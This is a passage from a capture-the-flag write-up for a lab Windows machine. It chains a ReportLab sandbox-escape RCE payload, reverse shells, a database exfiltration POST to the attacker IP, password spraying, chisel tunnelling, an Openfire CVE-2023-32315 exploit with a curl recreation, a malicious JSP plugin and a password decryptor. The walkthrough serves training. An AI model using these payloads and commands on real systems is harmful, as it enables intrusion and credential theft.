Python reads the innermost part first, and then moves outward — so it can feel like you’re reading from the bottom up.

So, the full attack looks like:

```python
[
  [
    # Run the command using system()
    getattr(pow, Word('__globals__'))['os'].system('[maliciousCommandHere]')

    # Create the fake "Word" class to trick the sandbox
    for Word in [
      orgTypeFun(
        'Word',
        (str,),
        {
          'mutated': 1,
          'startswith': lambda self, x: False,
          '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
          'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
          '__hash__': lambda self: hash(str(self))
        }
      )
    ]
  ]

  # Recover the real type() function
  for orgTypeFun in [type(type(1))]
]
```

Summary (Super Simple)

| Step | What We Did             | Why                                          |
|------|-------------------------|----------------------------------------------|
| 1    | Recover original type() | Get real Python powers back                  |
| 2    | Build fake class Word   | Trick sandbox’s safety checks                |
| 3    | Get to globals()        | Find dangerous functions like os.system()    |
| 4    | One-liner trick         | Run everything at once, bypassing line limit |


#### Step 5: Wrap it in html tags: {#step-5-wrap-it-in-html-tags}

For this to work we need to wrap the payload in `html` tags like below. This is because there a specific library is called when processing `html` which will in turn process our payload. Looking at the write up we can see the below:

> A lot of apps and libraries use the Reportlab library for example xhtml2pdf utility function is vulnerable and can suffer from code execution while transforming malicious HTML to pdf

I have modified the initial payload to be a ping command as this should be accessible by most OS's and enable us to prove RCE.

```html
<para>
    <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('ping 10.10.14.20') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
    exploit
    </font>
</para>
```

We need to start a listener using `tcpdump` to listen out for the ICMP requests that we get

```shell
sudo tcpdump -i tun0 icmp
```


### Getting RCE On The Target: {#getting-rce-on-the-target}


#### Finding our injection point for RCE: {#finding-our-injection-point-for-rce}

Now we have a payload and a listener setup we need to actually find somewhere to inject this on the web-app. To save you all heartache, here are the things I tried before finding a valid injection point:


##### What didn't work: {#what-didn-t-work}

1.  Put code in "Justification box"
    -   In code box (too long as 300 char limit) so intercepted in burp and then pasted full payload in-case we could bypass via this method.
    -   Out of code box (raw text) same as above.
    -   In code box then intercepted in burp and removed the tags same as above.

2.  In a logo file as html:
    -   Intercepted in burp and changed the mime/type to bypass validation.
    -   Created a png with a double extension and intercepted.


#### Getting Our RCE POC To Work! {#getting-our-rce-poc-to-work}

We can use the "Leave Request" template and enter all of the below placeholder information. We then set burp to intercept and press "Generate PDF" to create the `POST` request we can then grab the request and send it to Repeater.

-   {{< figure src="/ox-hugo/2025-04-18-090327_.png" >}}

In repeater we can paste the payload into the `leave_request` parameter, remember everything get's processed by the library when generating the PDF!

-   {{< figure src="/ox-hugo/2025-04-18-090353_.png" >}}

Boom we have pings coming back to our host machine so we know this host is vulnerable and we have RCE!

-   {{< figure src="/ox-hugo/2025-04-18-090410_.png" >}}


#### Testing If We Can Use Curl: {#testing-if-we-can-use-curl}

We can modify the payload to the below and setup a simple nc listener to see if we can get a call-back to ourselves.

1.  Create listener
    ```shell
    nc -nvlp 8888
    ```

2.  Modify the payload to be a curl request:
    ```nil
    curl  http://10.10.14.20:8888/testnc
    ```

    -   {{< figure src="/ox-hugo/2025-04-18-090740_.png" >}}
3.  We get a connection so we can curl down a script for it to be executed if want.
    -   {{< figure src="/ox-hugo/2025-04-18-090856_.png" >}}


### Getting A Reverse Shell: {#getting-a-reverse-shell}

I was going to use a download cradle to download and execute this, however I opted for
We are going to use a super simple base64 encoded powershell reverse shell available from revshells.com

-   {{< figure src="/ox-hugo/2025-04-18-094405_.png" >}}

Start out listener:

```shell
nc -nvlp 8888
```

Modify the payload, by again capturing a POST request and sending it to Repeater.

-   {{< figure src="/ox-hugo/2025-04-18-094454_.png" >}}

Shell caught:

-   {{< figure src="/ox-hugo/2025-04-18-094527_.png" >}}

Lets grab our User.txt

-   {{< figure src="/ox-hugo/2025-04-18-094739_.png" >}}


### Discover `user.db` file: {#discover-user-dot-db-file}

After some enumeration I find a database called `users.db` in the directory "C:\Users\blake\Documents\app\instance\\"

As we are working with a limited shell at the moment&#x2026;.and I haven't gotten around to upgrading it just yet we will use a simple base64 transfer method to transfer the db to ourselves.

1.  First we convert the `users.db` object to base64 and store it in the variable `$b64`
    ```powershell
    $b64 = [System.Convert]::ToBase64String((Get-Content -path "C:\Users\blake\Documents\app\instance\users.db" -Encoding byte))
    ```

    -   {{< figure src="/ox-hugo/2025-04-18-155224_.png" >}}

2.  Start a listener on our host:
    ```shell
    nc -nvlp 8888
    ```

3.  Send the base64 encoded string to our listener:
    ```powershell
    Invoke-WebRequest -Uri http://10.10.14.20:8888/ -Method POST -Body $b64
    ```

    -   {{< figure src="/ox-hugo/2025-04-18-153915_.png" >}}
    -   Caught base64 on our listener
        -   {{< figure src="/ox-hugo/2025-04-18-153723_.png" >}}

4.  Now we decode the bas64 back into `users.db`

<!--listend-->

```shell
echo "base64string" | base64 -d -w 0 > users.db
```


### Finding Users Passwords in `users.db`: {#finding-users-passwords-in-users-dot-db}

We can load the `users.db` file into sqlitebrowser and looking at the `user` table we can see it contains usernames and passwords

-   {{< figure src="/ox-hugo/2025-04-18-160131_.png" >}}


### Discovering Password Lockout Policy: {#discovering-password-lockout-policy}

I cred stuff them using netexec &amp; smb but notice I get lockout warnings.

-   {{< figure src="/ox-hugo/2025-04-18-170556_.png" >}}

I check the password policy and can see that there is a 10 failed password attempt limit that lasts for a duration of 10 minutes.

-   {{< figure src="/ox-hugo/2025-04-18-170356_.png" >}}
    -   +Note+: This would not have been issue as so far we have only found 8 "passwords" in total however I was also spraying the answers to security questions, which led me to being locked out.

Whilst waiting for the password policy locking to finish further hunting I find another db in `\app\reports\instance`

I repeat the same process of transferring via base64 as above in-case there is any difference and there is, however it is just additional lines where they are using their names as passwords.

-   {{< figure src="/ox-hugo/2025-04-18-161722_.png" >}}


## 3. Lateral Movement: {#3-dot-lateral-movement}


### Discovering OpenFire's password due to password re-use. {#discovering-openfire-s-password-due-to-password-re-use-dot}

Now that the 10 minute lockout time is up we can password spray with netexec, and we see we get a hit for the user `OpenFire` with our newly found passwords, it turns out Alexander has been naughty and is re-using their password.

```shell
netexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep [+]
```

-   {{< figure src="/ox-hugo/2025-04-18-171858_.png" >}}


### What is OpenFire? {#what-is-openfire}

After some quick searching online, we can see that OpenFire is an instant messaging app. Checking the documentation we can see the default port for the service is `9090` and it is by default only accessible from the host itself.

-   {{< figure src="/ox-hugo/2025-04-18-182114_.png" >}}

Running `netstat` we can see that it does appear to be running locally.

```powershell
netstat -ano
```

-   {{< figure src="/ox-hugo/2025-04-18-182410_.png" >}}


### Creating a tunnel with [chisel](https://github.com/jpillora/chisel): {#creating-a-tunnel-with-chisel}

As OpenFire is running locally we have no way of accessing it without creating a tunnel back to ourselves to access it, so lets do that with [chisel](https://github.com/jpillora/chisel).

-   +Note+: I would usually use [ligolo-ng](https://github.com/Nicocha30/ligolo-ng) as that's my preferred tunneling tool however it's been a while since I've used chisel and this is a good way to dust off the cobwebs.

**Prerequisite**: You will need the binaries, for both Debian (if using kali/parrot etc as an attack machine) and for the target Windows, you can get these from:  <https://github.com/jpillora/chisel/releases/>

1.  Transfer the binary to the target
    ```powershell
    wget http://10.10.14.20:9000/chisel.exe -o chisel.exe
    ```

2.  Start a listener on kali:
    ```shell
    ./chisel server -p 8989 --reverse
    ```

3.  Connect back to our listener on kali and redirect traffic from port `9090` on the target to port `8000` on our attack machine.
    ```shell
    .\chisel.exe client 10.10.14.20:8989 R:8000:127.0.0.1:9090
    ```

    -   {{< figure src="/ox-hugo/2025-04-18-185924_.png" >}}
    -   {{< figure src="/ox-hugo/2025-04-18-185942_.png" >}}

Let's verify if we can access the service, and we can.

-   {{< figure src="/ox-hugo/2025-04-18-185756_.png" >}}
    -   +Note+: We can see it's running version `4.7.4`


### Finding POC for OpenFire CVE-2023-32315 {#finding-poc-for-openfire-cve-2023-32315}

Some quick searching online and we can see there is a vulnerability which affects this version of OpenFire.

-   <https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT>

We can download the exploit easily

```shell
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT/refs/heads/main/CVE-2023-32315.py
```


#### Code Review for CVE-2023-32315 exploit: {#code-review-for-cve-2023-32315-exploit}

Again I find this incredibly beneficial as a means to actually understand the underlying the mechanism that is being exploited so that it deepens our understanding. If you are already familiar with this exploit and the underlying mechanism I would skip this part, but if you are not there is a lot to learn here + you can learn a lil' bit of python too.

The exploit itself is only 110 lines long and a large part of this is used to for presentation and basic functionality purpose e.g. making it look nice and calling main functions etc so we can ignore those parts and focus on the actual exploitation parts.


##### Library Imports: {#library-imports}

Here we have the imports for libraries.

```python
import argparse
import subprocess
import requests
from rich.console import Console
```

-   These are standard libraries, `argparse` is for parsing command line arguments and  `rich.console` is used for making things look nice. The libraries doing the heavy lifting in this script are `subprocess` (like we saw in the previous exploit it is used for running external commands and managing processes from within python &amp; `requests` is used for HTTP requests.


##### `get_csrf_token` function: {#get-csrf-token-function}

This function is used to extract the `csrf` token.

```python

def get_csrf_token(target_url):
    try:
        response = requests.head(target_url + "/login.jsp")
        cookies = response.cookies.get_dict()
        csrf_token = cookies.get('csrf')
        return csrf_token
    except requests.RequestException:
        return None

```

This function retrieves the Cross-Site-Request-Forgery(CSRF) token by making a call to the `/login.jsp` endpoint via a `HEAD` request.

It takes one argument, the `target_url` (user supplied on execution) it concatenates the supplied url with the endpoint to create `target_url/login.jsp`.

It stores the response in a variable `response`, then parses the response for `cookies` and stores them in a dictionary.

The dictionary is then checked for the key `csrf` and then returns that value in the `csrf_token` variable.

If it receives a request exception then it returns the response `None` instead.

As you can see this is just a HEAD request that could be performed in a browser or via cli like so.

```bash
#Command
curl -I http://[targetURL]/login.jsp | grep -e 'csrf'

#Example
curl -I http://127.0.0.1:8000/login.jsp | grep -e 'csrf'
```


##### `add_credentials` function: {#add-credentials-function}

This is where the exploitation logic is declared.

```python
def add_credentials(target_url, csrf_token, username, password):
    color.print(f"[blue][*][/blue] Launching exploit against: [yellow]{target_url}[/yellow]")
```

The function takes four arguments, `target_url`, `csrf_token`, `username`, and `password`. We've already seen the `target_url` and `csrf_token` in previous steps, so the only new inputs here are `username` and `password`, used to create a new user.

First, it prints a message indicating that it's launching the exploit against the specified `target_url`.

<!--list-separator-->

-  Constructing vulnerable paths &amp; headers:

    Next, it constructs a hard-coded vulnerable path called `vuln_path` &amp; declares the `Headers`

    ```python
        vuln_path = f'/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf_token}&username={username}&password={password}&passwordConfirm={password}&isadmin=on&create=Create%2bUser'
        headers = {
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en-US;q=0.9,en;q=0.8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36",
            "Connection": "close",
            "Cache-Control": "max-age=0",
            "Cookie": f"csrf={csrf_token}"
        }
    ```

    What’s interesting here is that the path traversal occurs at the beginning of the URL: `/setup/setup-s/%u002e%u002e/%u002e%u002e/`, which decodes to `../../` This allows the exploit to reach the `user-create.jsp` endpoint (an endpoint it normally shouldn’t have access to). The path also includes URL parameters like `csrf_token`, `username`, `password`, and other fields required to create a new admin user.

    The use of path traversal suggests that attackers could potentially access other unintended endpoints as well &amp; not just `user-create.jsp`.

    -   +Note+: After some quick searching I am right it's possible to access other unintended endpoints as outlined in this great article.
        -   <https://vulncheck.com/blog/openfire-cve-2023-32315>

    Finally, the headers dictionary includes standard HTTP headers along with the `csrf_token` again, set as a cookie used to mimic a legitimate session and bypass CSRF protections

<!--list-separator-->

-  `check_vuln`:

    The following logic is used to check if the target is valid, perform the exploit &amp; then verify if the exploit has been successful.

    ```python
        check_vuln = requests.get(target_url, headers=headers, verify=False).status_code
        if check_vuln == 200:
            color.print("[green][+][/green] Target is vulnerable")
            color.print("[blue][*][/blue] Adding credentials")

    ```

    The variable `check_vuln` uses the `requests` library to send a `GET` request to the `target_url` along with the `headers` dictionary (containing the previously extracted `csrf` token). It sets `verify=False` to skip the SSL certificate validation (this is most likely done as instances of OpenFire will be running internally with self signed certs and will fail SSL validation)

    The status code is returned back `.status_code` &amp; checked if it is equal `==` to `200` (meaning it was successful) it will print out that the target is vulnerable &amp; move onto the next part of the logic, adding credentials.

<!--list-separator-->

-  `add_credentials_cmd`:

    This logic is for adding the credentials to the target.

    ```python
            add_credentials_cmd = f"curl -I -X GET '{target_url}{vuln_path}' " \
                    "-H 'Accept-Encoding: gzip, deflate' " \
                    "-H 'Accept: */*' " \
                    "-H 'Accept-Language: en-US;q=0.9,en;q=0.8' " \
                    "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36' " \
                    "-H 'Connection: close' " \
                    "-H 'Cache-Control: max-age=0' " \
                   f"-H 'Cookie: csrf={csrf_token}'"
    ```

    First a multi-line string is declared which consists of a standard `GET` (in a way&#x2026;keep reading) request using `curl`. We are using the `-I` flag to actually turn this `GET` request into a `HEAD` request.

    From the `curl` man pages.

    ```quote
    -I, --head
                  (HTTP  FTP FILE) Fetch the headers only. HTTP-servers feature the command HEAD which this uses
                  to get nothing but the header of a document. When used on an FTP or FILE  URL,  curl  displays
                  the file size and last modification time only.
    ```

    What is strange though is that the logic then uses `-X GET` which contradicts the `-I` flag as both flags are trying to control the HTTP method being used.  I'm unsure if this is intentional or a mistake by the author. Just to note, `curl` will typically prioritize the `-X` flag meaning this would still result in a `GET` request.

    The `target_url` &amp; `vuln_path` are combined to form the final endpoint. If you remember, `vuln_path` contains the `password` &amp; `username` of our new user as well as the other required url parameters to create the new users.

    The remaining lines contain standard HTTP headers required to mimic a legitimate browser request. the `GET` request, as well as our `csrf_token` cookie passed for validation.

<!--list-separator-->

-  process the cmd command:

    This logic is used for actually sending the malicious request via the subprocess library.

    ```python

            process = subprocess.Popen(add_credentials_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if "200" in str(output):
                color.print("[green][+][/green] Successfully added, here are the credentials")
                color.print(f"[green][+][/green] Username: [green]{username}[/green]")
                color.print(f"[green][+][/green] Password: [green]{password}[/green]")
            else:
                color.print("[red][~][red] Failed to add credentials")
    ```

    We create a variable called `process` which opens a new subprocess and executes the `add_credentials_cmd` `curl` request defined in the previous step. It opens a `shell` (to run the command) and captures both `stdout` and `stderr` using `subprocess.PIPE`.

    We then call `process.communicate()` which returns a tuple containing the `stdout` and `stderr`, which we store in the variables `output` &amp; `error`.

    The logic then checks if the string `200` (a valid HTTP response) is contained in the `output` (`stdout`). If does we print a success message otherwise we print a failure messsage.


##### `exploit` function: {#exploit-function}

This is, as you have probably guessed where the exploit logic is executed.

```python
def exploit(target_url):
    username = "hugme"
    password = "HugmeNOW"
    try:
        csrf_token = get_csrf_token(target_url)
        if csrf_token:
            add_credentials(target_url, csrf_token, username, password)
        else:
            color.print("[red][~][/red] CSRF token not found in headers. Vulnerability may not exist.")
    except requests.RequestException:
        pass
```

The function takes one argument `target_url`.

Two hard-coded variables are declared `username` &amp; `password`, which we saw previously are used to create the user account.

Next it attempts to retrieve the `csrf` token by running the `csrf_token` function, which if successful will return the `csrf_token` variable, if it is valid e.g. does not return `None`, it will then run the `add_credentials` function to create the user on the host. If `None` e.g. a `csrf` token is not found it will tell us, suggesting it is not vulnerable.

Any `requests.RequestException` errors are caught and ignored `pass`.


### Side-Quest Recreating the exploit just using `curl`: {#side-quest-recreating-the-exploit-just-using-curl}

This is just to show how simple this exploit is. I like doing side-quests like these to further cement the learning, if you want you can just use the downloaded exploit. But as you'll see it's possible to just recreate this exploit on the command line as it's just two `curl` commands. The first to retrieve the `csrf` token and the second to create the user.

```shell
# Set our target url.
target_url="http://127.0.0.1:8000"

#Url Encode our Username & Password as these are sent via url
username=$(python3 -c "import urllib.parse; print(urllib.parse.quote('bloodstiller'))")
password=$(python3 -c "import urllib.parse; print(urllib.parse.quote('bL00dsT11L3r'))")

# Retrieve the 'csrf token'
curl "$target_url/login.jsp" | grep -i 'csrf'
csrf_token="GS7T6L1u3xxBCzq"

# Set Vulerable Path
vuln_path="/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=${csrf_token}&username=${username}&password=${password}&passwordConfirm=${password}&isadmin=on&create=Create%2bUser"

# Send Curl request
curl -L -X GET "$target_url$vuln_path" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept: */*" \
  -H "Accept-Language: en-US;q=0.9,en;q=0.8" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -H "Connection: close" \
  -H "Cache-Control: max-age=0" \
  -H "Cookie: csrf=$csrf_token"
```

-   {{< figure src="/ox-hugo/2025-04-21-100527_.png" >}}
    -   As you can see it threw an `Exception` (it will do this in python as well however in the python script there is `Exception` handling)

And we are in!

-   {{< figure src="/ox-hugo/2025-04-21-100407_.png" >}}


### Discovering we can upload plugins: {#discovering-we-can-upload-plugins}

Looking around we can see we can upload plugins in the `.jar` format, which means it should, in theory, be possible to upload shell of some sort.

-   {{< figure src="/ox-hugo/2025-04-21-105604_.png" >}}

After some searching online this page details exploiting this specific vulnerability so we can follow this.

-   <https://vulncheck.com/blog/openfire-cve-2023-32315>
-   +Note+: I would encourage reading this as it actually details how to perform the exploit without logging in as a means to avoid logs. It takes advantage of the same CVE-2023-32315 vulnerability to directly upload a malicious plugin.


### Creating a malicious reverse shell plugin for OpenFire: {#creating-a-malicious-reverse-shell-plugin-for-openfire}

After some searching online we can find a public java reverse shell

```shell
wget https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/refs/heads/main/shell.jsp
```

-   <https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0>

All we have to do is modify the Port &amp; IP.

-   {{< figure src="/ox-hugo/2025-04-21-104330_.png" >}}

Next we download the example plugin repo from OpenFire.

```shell
git clone https://github.com/igniterealtime/openfire-exampleplugin.git
```

We copy the `shell.jsp` to `exampleplugin-page.jsp` location for compilation

```shell
cp ../shell.jsp ./src/main/web/exampleplugin-page.jsp
```

We will need to install apache maven to compile this exploit, so if you don't have it already run the below to install it.

```shell
sudo apt update && sudo apt install maven -y
```

Now we need to create the package.

```shell
mvn -B package
```

Once complete you should get a successful build message:

-   {{< figure src="/ox-hugo/2025-04-21-105138_.png" >}}
    -   +Note+: There will most likely be ALOT of output here as maven will download the relevant dependencies etc **so be patient**.

Next we put the plugin into the correct structure for uploading to OpenFire.

```shell
cp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar;
```

The correct file is `exampleplugin.jar` located in `target/`

Start a listener:

```shell
rlwrap -cAr nc -nvlp 6969
```

Next we upload the exploit

-   {{< figure src="/ox-hugo/2025-04-21-110351_.png" >}}

Now we finally trigger the plugin so our reverse shell is active.

```shell
curl -v "http://127.0.0.1:8000/setup/setup-s/%u002e%u002e/%u002e%u002e/plugins/exampleplugin/exampleplugin-page.jsp?"
```

Again an exception will be thrown but we have our reverse shell.

-   {{< figure src="/ox-hugo/2025-04-21-110211_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Privesc as openfire: {#privesc-as-openfire}

If you just want to get to the good stuff you can jump straight to `openfire DB` part, however I left this all in as a means to show it's not as simple "you just do x then y then you're root" there is more to it.


#### Check for default creds: {#check-for-default-creds}

I run to check for stored credentials however we only get default credentials.

```cmd
cmdkey /list
```

-   {{< figure src="/ox-hugo/2025-04-21-135915_.png" >}}


##### What Is `virtualapp/didlogical`? {#what-is-virtualapp-didlogical}

This one confuses a lot of people. It's actually a default credential entry that Windows creates automatically in certain situations.

-   `virtualapp/didlogical` is a placeholder credential used internally by Windows often related to services like:
    -   Windows Live (Outlook, OneDrive)
    -   Remote Desktop/Live Sign-In
    -   Credential Manager
    -   Virtualized services / Hyper-V

The entry doesn’t usually correspond to an actual service or account we can use in any obvious way. It's often just tied to Windows features that sync settings or provide background services.


#### Enumerating Users/Groups &amp; privs: {#enumerating-users-groups-and-privs}

Next lets enumerate users groups &amp; privileges.

```powershell
whoami /priv /groups; query user; net user
```

-   {{< figure src="/ox-hugo/2025-04-21-140908_.png" >}}

We can see we are a service account and we have limited privileges.

Lets check if any other users are part of interesting groups.

```powershell
whoami /groups; net localgroup "Remote Desktop Users"; net localgroup "Administrators"; net localgroup "DNS Admins"; net localgroup "Backup Operators"; net localgroup "Print Operators"; net localgroup "Server Operators";  net localgroup "Event Log Readers"; net localgroup "Hyper-V Administrators"
```

Again nothing of note, it does not appear any of the users are part of any interesting groups.


#### Enumerating Installed Programs: {#enumerating-installed-programs}

Let's see if there are any interesting programs that we have not looked at so far.

```powershell
('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*') | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation | sort-object -Property Displayname -Unique |Format-Table -AutoSize
```

Nothing of note

-   {{< figure src="/ox-hugo/2025-04-21-142355_.png" >}}


#### Checking PATH and ENV's: {#checking-path-and-env-s}

PATH

```powershell
$Env:PATH
```

There are some interesting things here like SSH and python so we can put a pin in these until we get stuck.

-   {{< figure src="/ox-hugo/2025-04-21-142632_.png" >}}

Environmental Variables:

```powershell
Get-ChildItem Env:
```

Nothing of note

-   {{< figure src="/ox-hugo/2025-04-21-142756_.png" >}}


#### Non-disabled Scheduled Tasks: {#non-disabled-scheduled-tasks}

```powershell
Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | Select-Object TaskName, TaskPath, State
```

There was nothing of note here, however I will not show the output as it was pages.


#### Running processes: {#running-processes}

```powershell
# Command to exclude standard windows processes
tasklist /svc | select-string -Pattern "svchost.*|LSASS*|winlogon*|smss*|csrss*" -NotMatch
```

It does show that `nginx.exe` is running which is to be expected as a webserver is running.

-   {{< figure src="/ox-hugo/2025-04-21-153134_.png" >}}

We can see that this is actually what is running ReportLab as when we look at the nginx `.conf` file in `C:\Program Files (x86)\nginx-1.24.0\` it is proxying the traffic from `report.solarlab.htb:6791` to the service running on `5000` locally.

-   {{< figure src="/ox-hugo/2025-04-21-152359_.png" >}}

This is also verifiable by reading the `app.py` file in `C:\Users\blake\Documents\app`

-   {{< figure src="/ox-hugo/2025-04-21-153052_.png" >}}

We can see that there is also a process called `waitress-serve.exe` running also.

-   {{< figure src="/ox-hugo/2025-04-21-153611_.png" >}}

But reading `start-app.bat` stored in `C:\Users\blake\Documents` we can see it's also part of this same webstack.

-   {{< figure src="/ox-hugo/2025-04-21-153717_.png" >}}


#### Check PowerShell History: {#check-powershell-history}

```powershell
Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine" | Format-Table -AutoSize
```

Nothing of note&#x2026;well nothing actually.


#### Openfire DB {#openfire-db}

I look through the openfire folder structure and find there is a file called `openfire.script` located in `C:\Program Files\Openfire\embedded-db` initially it confused me as it just appears to be a list of SQL commands, however after some looking online we can find this entry on the [openfire discourse](https://discourse.igniterealtime.org/t/location-and-structure-of-embedded-db/57190) which shows the following, letting us know the `.script` is the actual database.

-   {{< figure src="/ox-hugo/2025-04-21-160016_.png" >}}

Looking through it we can find the below entry which appears to be the entry for the admin user &amp; what looks to be an hashed password.

```sql
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
```

Some further searching also reveals a password key.

```sql
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
```

After some searching online I found some old decryption tools however that's no fun so lets write one in python.


### Decrypting Openfire Passwords with Python (Understanding the Mechanism) {#decrypting-openfire-passwords-with-python--understanding-the-mechanism}

I love these kinds of reverse engineering exercises. They’re gold for understanding how applications store and secure (or fail to secure) credentials. If you're familiar with Blowfish encryption or Openfire's password handling, you might want to skip ahead. But if you're not, or just want to level up your Python, this is for you.

We’re going to look at a short but powerful Python script that mimics the decryption logic Openfire uses internally to store admin console credentials.


#### What We're Dealing With: {#what-we-re-dealing-with}

Openfire encrypts passwords using the Blowfish cipher in CBC mode, and stores them hex-encoded with a prepended IV (Initialization Vector). This means if we’ve got the key and the encoded password, we can decrypt it, we just need to replicate Openfire’s process.

This is useful for recovering credentials from old backups, reversing malware configs using Openfire, or (you know)&#x2026;. offensive research.

Here’s the core decryptor logic we’re going to walk through.

```python
#!/usr/bin/env python3

from Crypto.Cipher import Blowfish
from Crypto.Hash import SHA1
import binascii


def decrypt_openfire_pass(ciphertext_hex: str, key: str) -> str:
    # Convert the key to SHA-1:
    sha1_key = SHA1.new(key.encode()).digest()

    # Decode the hex-encoded ciphertext
    ciphertext = binascii.unhexlify(ciphertext_hex)

    # Get IV (first 8 bytes) and actual ciphertext
    iv = ciphertext[:8]
    encrypted_data = ciphertext[8:]

    # Decrypt using Blowfish CBC
    cipher = Blowfish.new(sha1_key, Blowfish.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_data)

    # Strip padding (Openfire uses PKCS5/PKCS7-like padding)
    pad_len = decrypted[-1]
    return decrypted[:-pad_len].decode("utf-8")


# Enter our found ciphertext & key
ciphertext = "becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442"
key = "hGXiFzsKaAeYLjn"

print(decrypt_openfire_pass(ciphertext, key))
```


#### Let’s Break it Down: {#let-s-break-it-down}

Each part of this script mimics something Openfire does internally, step by step.


##### Importing Libraries: {#importing-libraries}

```python
from Crypto.Cipher import Blowfish
from Crypto.Hash import SHA1
import binascii
```

-   `Crypto.Cipher.Blowfish` gives us the Blowfish cipher in CBC mode.
-   `Crypto.Hash` is used for generating the encryption key using SHA-1.
-   `binascii` helps us convert hex-encoded strings to bytes.

These are all standard and widely used in Python crypto work — no weird dependencies here.


##### Creating the Encryption Key: {#creating-the-encryption-key}

```python
sha1_key = hashlib.sha1(key.encode()).digest()
```

The original key is not used directly — it’s hashed using `SHA-1` to derive a 20-byte key, which is what Openfire expects. The `.digest()` returns the raw bytes instead of a hex string.

This mimics in java:

```java
MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
byte[] key = sha1.digest(passphrase.getBytes());
```


##### Parsing the Encrypted Password: {#parsing-the-encrypted-password}

```python
ciphertext_bytes = binascii.unhexlify(ciphertext_hex)
```

Openfire stores the encrypted string in hex. We decode it to raw bytes using `unhexlify`.

Example:

```python
"f4b5f7..."  →  b"\xf4\xb5\xf7..."
```


##### Extracting the IV: {#extracting-the-iv}

```python
iv = ciphertext_bytes[:8]
ciphertext = ciphertext_bytes[8:]
```

The IV (initialization vector) is the first 8 bytes of the ciphertext. Blowfish in CBC mode always needs a random IV to prevent repeatable ciphertext, but Openfire conveniently stores the IV in front of the encrypted content.


##### Decrypting the Ciphertext: {#decrypting-the-ciphertext}

```python
cipher = Blowfish.new(sha1_key, Blowfish.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
```

We create the cipher using the SHA-1-derived key and the IV, then decrypt the ciphertext.


##### Removing Padding: {#removing-padding}

Blowfish has a block size of 8 bytes, so padding is likely used.

```python
    pad_len = decrypted[-1]
    return decrypted[:-pad_len].decode("utf-8")
```

Openfire pads the plaintext to match the block size — so we strip trailing null-bytes `\x00s` before decoding it as a `UTF-8` string.

As an example this line turns:

```python
b"mypassword\x00\x00\x00" → "mypassword"
```


##### Provide ciphertext &amp; key: {#provide-ciphertext-and-key}

```python
ciphertext = "becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442"
key = "hGXiFzsKaAeYLjn"
print(decrypt_openfire_pass(encrypted, key))
```

This would print the decrypted password stored in Openfire, assuming we have got the key right&#x2026;..


#### Creating a `venv` to run it in: {#creating-a-venv-to-run-it-in}

Now that we have our script we need to install one dependency, `pycrptodome`, to avoid messing up our base python installation lets create a virtual environment.

```shell
# Create the venv
python -m venv openfire-decrypt

# Activate it
source openfire-decrypt/bin/activate

# Install our dependency
pip install pycryptodome
```

-   {{< figure src="/ox-hugo/2025-04-21-162108_.png" >}}


#### Decrypting the found password: {#decrypting-the-found-password}

If we run the decryption tool we should now get the password

```shell
python3 openfiredecrypt.py
```

-   {{< figure src="/ox-hugo/2025-04-21-162145_.png" >}}


#### Verifying The Password is Valid: {#verifying-the-password-is-valid}

As we can see this is valid!

-   {{< figure src="/ox-hugo/2025-04-21-162242_.png" >}}


### Using `impacket-psexec` to get an `NT/Authority` shell: {#using-impacket-psexec-to-get-an-nt-authority-shell}

As there are no other means to connect, let's use `impacket-psexec` to access the host.

```shell
impacket-psexec $user@$box
```

-   {{< figure src="/ox-hugo/2025-04-21-162726_.png" >}}

Lets get our root flag:

